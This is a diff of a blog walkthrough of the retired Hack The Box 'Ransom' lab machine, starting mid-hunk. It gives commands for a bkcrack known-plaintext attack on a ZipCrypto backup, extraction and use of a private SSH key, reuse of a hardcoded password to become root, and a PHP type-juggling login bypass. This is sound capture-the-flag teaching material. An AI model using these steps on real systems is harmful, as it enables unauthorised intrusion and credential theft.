 <pre><code>href="/uploaded-file-3422.zip"
 href="/user.txt"
@@ -204,25 +199,25 @@ curl -s -b /tmp/cookies.txt http://10.129.227.93/uploaded-file-3422.zip \
   -o /tmp/uploaded-file-3422.zip
 </code></pre>
 <p><strong>User flag:</strong> <code>69f82c[redacted]aae72ae</code></p>
-<hr />
-<h2 id="step-6-analyzing-the-encrypted-zip">Step 6 — Analyzing the Encrypted ZIP</h2>
-<h3 id="what-we-do-6">What we do</h3>
+<hr>
+<h2 id="step-6-analyzing-the-encrypted-zip">Step 6: Analyzing the Encrypted ZIP</h2>
+
 <pre><code class="language-bash" data-language="bash">7z l -slt /tmp/uploaded-file-3422.zip
 </code></pre>
-<h3 id="why-5">Why</h3>
+
 <p>Before trying to crack a password-protected file, understand <strong>what type of encryption</strong> it uses. <code>7z l -slt</code> lists files with full technical metadata including the encryption method.</p>
 <p>Key output:</p>
 <pre><code>Method = ZipCrypto Deflate
 CRC = 6CE3189B
 </code></pre>
-<h3 id="why-this-matters-enormously">Why this matters enormously</h3>
+<h3 id="zip-encryption-details">ZIP encryption details</h3>
 <p>There are two common ZIP encryption methods:</p>
 <ul>
-<li><strong>AES-256</strong>: Modern, strong — essentially uncrackable without the password</li>
-<li><strong>ZipCrypto</strong>: Legacy, from the 1990s — <strong>vulnerable to known-plaintext attack</strong></li>
+<li><strong>AES-256</strong>: Modern, strong - essentially uncrackable without the password</li>
+<li><strong>ZipCrypto</strong>: Legacy, from the 1990s - <strong>vulnerable to known-plaintext attack</strong></li>
 </ul>
-<p>ZipCrypto is broken. If you know the exact content of <strong>any one file</strong> inside the zip, you can recover the internal encryption keys and decrypt the entire archive — no password needed.</p>
-<p>The archive contains <code>.bash_logout</code> — a standard Ubuntu file that is almost never changed. The CRC32 value (<code>6CE3189B</code>) is a checksum of the decrypted file. We can verify our local copy matches:</p>
+<p>ZipCrypto is broken. If you know the exact content of <strong>any one file</strong> inside the zip, you can recover the internal encryption keys and decrypt the entire archive - no password needed.</p>
+<p>The archive contains <code>.bash_logout</code> - a standard Ubuntu file that is almost never changed. The CRC32 value (<code>6CE3189B</code>) is a checksum of the decrypted file. We can verify our local copy matches:</p>
 <pre><code class="language-bash" data-language="bash">python3 -c "
 import binascii
 with open('/home/kali/.bash_logout', 'rb') as f:
@@ -236,26 +231,25 @@ print('CRC32:', hex(binascii.crc32(data) &amp; 0xFFFFFFFF))
 CRC32: 0x6ce3189b
 </code></pre>
 <p><strong>Perfect match.</strong> Our local <code>.bash_logout</code> is identical to the one in the encrypted zip. We have our known plaintext.</p>
-<h3 id="hacker-mindset-5">Hacker Mindset</h3>
-<blockquote>
-<p>"I can't brute-force the password — ZipCrypto uses a 96-bit key. But I don't need to. If I know what one of the files contains, I can attack the cipher directly. What files in a home directory are predictable? .bash_logout, .bashrc, .profile — standard Ubuntu dotfiles that almost nobody changes."</p>
-</blockquote>
-<hr />
-<h2 id="step-7-known-plaintext-attack-with-bkcrack">Step 7 — Known-Plaintext Attack with bkcrack</h2>
-<h3 id="what-we-do-7">What we do</h3>
+
+
+
+<hr>
+<h2 id="step-7-known-plaintext-attack-with-bkcrack">Step 7: Known-Plaintext Attack with bkcrack</h2>
+
 <pre><code class="language-bash" data-language="bash"># Create an unencrypted zip with our known plaintext file
 cd /tmp &amp;&amp; zip plain.zip bash_logout
 
 # Run the known-plaintext attack
 bkcrack -C /tmp/uploaded-file-3422.zip -c .bash_logout -P /tmp/plain.zip -p bash_logout
 </code></pre>
-<h3 id="why-6">Why</h3>
+
 <p><code>bkcrack</code> implements the Biham-Kocher known-plaintext attack against ZipCrypto. It needs:</p>
 <ul>
-<li><code>-C</code> — the encrypted zip (the target)</li>
-<li><code>-c</code> — the name of the known file <strong>inside</strong> the encrypted zip</li>
-<li><code>-P</code> — an unencrypted zip containing our copy of that file</li>
-<li><code>-p</code> — the name of our copy inside the unencrypted zip</li>
+<li><code>-C</code> : the encrypted zip (the target)</li>
+<li><code>-c</code> : the name of the known file <strong>inside</strong> the encrypted zip</li>
+<li><code>-P</code> : an unencrypted zip containing our copy of that file</li>
+<li><code>-p</code> : the name of our copy inside the unencrypted zip</li>
 </ul>
 <p>The attack works by:</p>
 <ol>
@@ -264,16 +258,15 @@ bkcrack -C /tmp/uploaded-file-3422.zip -c .bash_logout -P /tmp/plain.zip -p bash
 <li>Using those keys to decrypt everything else in the archive</li>
 </ol>
 <p>This typically takes 1-3 minutes. The math involves reducing 2^96 possible states down to a tractable search space using the known bytes.</p>
-<h3 id="result-5">Result</h3>
+
 <pre><code>Keys: 7b549874 ebc25ec5 7e465e18
 </code></pre>
-<h3 id="hacker-mindset-6">Hacker Mindset</h3>
-<blockquote>
-<p>"I'm not attacking the password. I'm attacking the cipher's internal state. These are fundamentally different things. The password could be 50 characters long and I still don't need it."</p>
-</blockquote>
-<hr />
-<h2 id="step-8-unlocking-the-zip-and-extracting-the-ssh-key">Step 8 — Unlocking the ZIP &amp; Extracting the SSH Key</h2>
-<h3 id="what-we-do-8">What we do</h3>
+
+
+
+<hr>
+<h2 id="step-8-unlocking-the-zip-and-extracting-the-ssh-key">Step 8: Unlocking the ZIP &amp; Extracting the SSH Key</h2>
+
 <pre><code class="language-bash" data-language="bash"># Use the recovered keys to create a new zip with a known password
 bkcrack -C /tmp/uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 \
   -U /tmp/unlocked.zip pass
@@ -281,39 +274,38 @@ bkcrack -C /tmp/uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 \
 # Extract everything
 unzip -P pass /tmp/unlocked.zip -d /tmp/unzipped/
 </code></pre>
-<h3 id="why-7">Why</h3>
-<p>The recovered keys let <code>bkcrack</code> re-encrypt the archive with any password we choose. We pick <code>pass</code> — simple and memorable. Then we extract normally.</p>
-<h3 id="result-6">Result</h3>
+
+<p>The recovered keys let <code>bkcrack</code> re-encrypt the archive with any password we choose. We pick <code>pass</code> - simple and memorable. Then we extract normally.</p>
+
 <pre><code>/tmp/unzipped/.ssh/id_rsa      ← private SSH key
 /tmp/unzipped/.ssh/id_rsa.pub  ← public key (shows username: htb@ransom)
 </code></pre>
-<p>The public key ends with <code>htb@ransom</code> — this tells us the username is <code>htb</code>.</p>
-<hr />
-<h2 id="step-9-ssh-access-as-htb">Step 9 — SSH Access as htb</h2>
-<h3 id="what-we-do-9">What we do</h3>
+<p>The public key ends with <code>htb@ransom</code> - this tells us the username is <code>htb</code>.</p>
+<hr>
+<h2 id="step-9-ssh-access-as-htb">Step 9: SSH Access as htb</h2>
+
 <pre><code class="language-bash" data-language="bash">ssh -i /tmp/unzipped/.ssh/id_rsa htb@10.129.227.93
 </code></pre>
-<h3 id="why-8">Why</h3>
+
 <p>SSH key authentication uses asymmetric cryptography. The private key (<code>id_rsa</code>) proves identity without a password. Since the public key (<code>id_rsa.pub</code>) is in the user's <code>~/.ssh/authorized_keys</code>, the server accepts our private key as proof we are that user.</p>
-<h3 id="hacker-mindset-7">Hacker Mindset</h3>
-<blockquote>
-<p>"The zip contained the user's entire home directory — including their SSH keys. They backed up their home dir and served it through a web app with weak encryption. Now I have their private key and can impersonate them."</p>
-</blockquote>
-<h3 id="result-7">Result</h3>
+
+<p>"The zip contained the user's entire home directory - including their SSH keys. They backed up their home dir and served it through a web app with weak encryption. Now I have their private key and can impersonate them."</p>
+
+
 <pre><code>htb@ransom:~$ id
 uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
 </code></pre>
 <p>We're in. Now we escalate.</p>
-<hr />
-<h2 id="step-10-privilege-escalation-to-root">Step 10 — Privilege Escalation to Root</h2>
-<h3 id="enumeration-mindset">Enumeration mindset</h3>
+<hr>
+<h2 id="step-10-privilege-escalation-to-root">Step 10: Privilege Escalation to Root</h2>
+<h3 id="enumeration-approach">Enumeration approach</h3>
 <p>Once you have a shell, resist the urge to randomly run <code>sudo -l</code> and <code>linpeas</code> immediately. <strong>Think about what you already know:</strong></p>
 <ul>
 <li>This is a Laravel web application</li>
 <li>The login had a hardcoded password comparison in the source code</li>
-<li>We haven't read that source yet — and hardcoded credentials often get reused</li>
+<li>We haven't read that source yet - and hardcoded credentials often get reused</li>
 </ul>
-<h3 id="what-we-do-10">What we do</h3>
+
 <p>Find the authentication controller and read the source:</p>
 <pre><code class="language-bash" data-language="bash">cat /srv/prod/app/Http/Controllers/AuthController.php
 </code></pre>
@@ -323,11 +315,11 @@ uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),4
     return "Login Successful";
 }
 </code></pre>
-<p>The password <code>UHC-March-Global-PW!</code> is hardcoded in the source. Developers often reuse passwords. Let's try it for root:</p>
+<p>The password <code>REDACTED</code> is hardcoded in the source. Developers often reuse passwords. Try it for root:</p>
 <pre><code class="language-bash" data-language="bash">su -
-# Password: null
+# Password: REDACTED
 </code></pre>
-<h3 id="result-8">Result</h3>
+
 <pre><code>root@ransom:~# id
 uid=0(root) gid=0(root) groups=0(root)
 
@@ -335,19 +327,17 @@ root@ransom:~# cat /root/root.txt
 e3b5c[redacted]e0f4c68f
 </code></pre>
 <p><strong>Root flag:</strong> <code>e3b5c[redacted]e0f4c68f</code></p>
-<h3 id="hacker-mindset-8">Hacker Mindset</h3>
-<blockquote>
-<p>"The application had a hardcoded password. Developers who hardcode passwords in web apps often reuse those passwords elsewhere on the system — because it's 'just a test' or 'temporary'. Always try found credentials horizontally (other services) and vertically (higher privilege accounts)."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="key-lessons">Key Lessons</h2>
 <h3 id="1-always-read-source-code-js-before-attacking-a-login">1. Always read source code / JS before attacking a login</h3>
-<p>The JavaScript told us exactly how the login worked — a GET request with a password parameter. Without reading it, we'd waste time on SQLi and brute force.</p>
+<p>The JavaScript told us exactly how the login worked - a GET request with a password parameter. Without reading it, we'd waste time on SQLi and brute force.</p>
 <h3 id="2-data-type-matters-as-much-as-data-value">2. Data type matters as much as data value</h3>
-<p>The type juggling bypass worked not because we found the right password — we changed the <strong>type</strong> of what we sent. <code>true</code> bypassed the check entirely. In PHP (and other weakly typed languages), <code>==</code> compares loosely — always look for type confusion opportunities.</p>
+<p>The type juggling bypass worked not because we found the right password - we changed the <strong>type</strong> of what we sent. <code>true</code> bypassed the check entirely. In PHP (and other weakly typed languages), <code>==</code> compares loosely - always look for type confusion opportunities.</p>
 <h3 id="3-legacy-encryption-is-often-just-theater">3. Legacy encryption is often just theater</h3>
 <p>ZipCrypto encryption provides a false sense of security. The moment you see <code>Method = ZipCrypto</code> in a zip file, treat it as effectively unencrypted if you have any known plaintext. Modern tools like bkcrack make this trivial.</p>
-<h3 id="4-home-directory-backups-are-a-goldmine">4. Home directory backups are a goldmine</h3>
+<h3 id="4-home-directory-backups-are-useful-sources">4. Home directory backups are useful sources</h3>
 <p>If an application serves a user's home directory backup, that zip contains:</p>
 <ul>
 <li>SSH keys</li>
@@ -360,23 +350,22 @@ Always enumerate every file in such archives.</li>
 <p>The password in the PHP source was the root password. Always try every credential you find against every authentication point: <code>su</code>, <code>sudo</code>, SSH for other users, database logins, etc.</p>
 <h3 id="6-enumeration-order-matters">6. Enumeration order matters</h3>
 <p>We went: web app → auth bypass → download files → crack zip → SSH → read source → su root. Each step gave us exactly what we needed for the next. This is why methodology beats random tool-running.</p>
-<hr />
+<hr>
 <h2 id="full-attack-chain-summary">Full Attack Chain Summary</h2>
 <pre><code>nmap (ports 22, 80)
-    └─&gt; Web app on port 80 — Laravel, redirects to /login
-            └─&gt; Read JS source — login is GET /api/login?password=REDACTED
-                    └─&gt; Send JSON {"password": null — PHP type juggling bypass
-                            └─&gt; Authenticated session — download user.txt + zip
+    └─&gt; Web app on port 80 - Laravel, redirects to /login
+            └─&gt; Read JS source - login is GET /api/login?password=REDACTED
+                    └─&gt; Send JSON {"password": true} - PHP type juggling bypass
+                            └─&gt; Authenticated session - download user.txt + zip
                                     └─&gt; 7z shows ZipCrypto + .bash_logout CRC matches local
                                             └─&gt; bkcrack known-plaintext attack → keys
                                                     └─&gt; Unlock zip → id_rsa extracted
                                                             └─&gt; SSH as htb
                                                                     └─&gt; AuthController.php → hardcoded password
                                                                             └─&gt; su - root → root.txt
-</code></pre>
-12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$17"}}]
+</code></pre>12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$17"}}]
 13:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-quick-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Quick Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ready-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Ready Walkthrough"}]]}]}]]}]
 14:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-18:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/#article","headline":"Hack The Box: Ransom Walkthrough","description":"An archived walkthrough of the retired Hack The Box Ransom machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/","datePublished":"2026-06-11T12:00:34.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2201,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6b1d02536f677f09f853ea8c29739182b0b2c0c1/HTB-Ransom.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-ransom-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Ransom Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/"}]}]}15:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$18"}}]
+18:T561,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/#article","headline":"Hack The Box: Ransom Walkthrough","description":"A JSON boolean bypassed the Laravel login, a known-plaintext attack on the downloaded ZipCrypto backup recovered htb's SSH key, and the hardcoded application password in source also authenticated as root.","url":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/","datePublished":"2026-06-11T12:00:34.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1944,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6b1d02536f677f09f853ea8c29739182b0b2c0c1/HTB-Ransom.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-ransom-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Ransom Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-ransom-walkthrough/"}]}]}15:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$18"}}]
 16:["$","$L19",null,{"children":["$","$1a",null,{"name":"Next.MetadataOutlet","children":"$@1b"}]}]
 1b:null
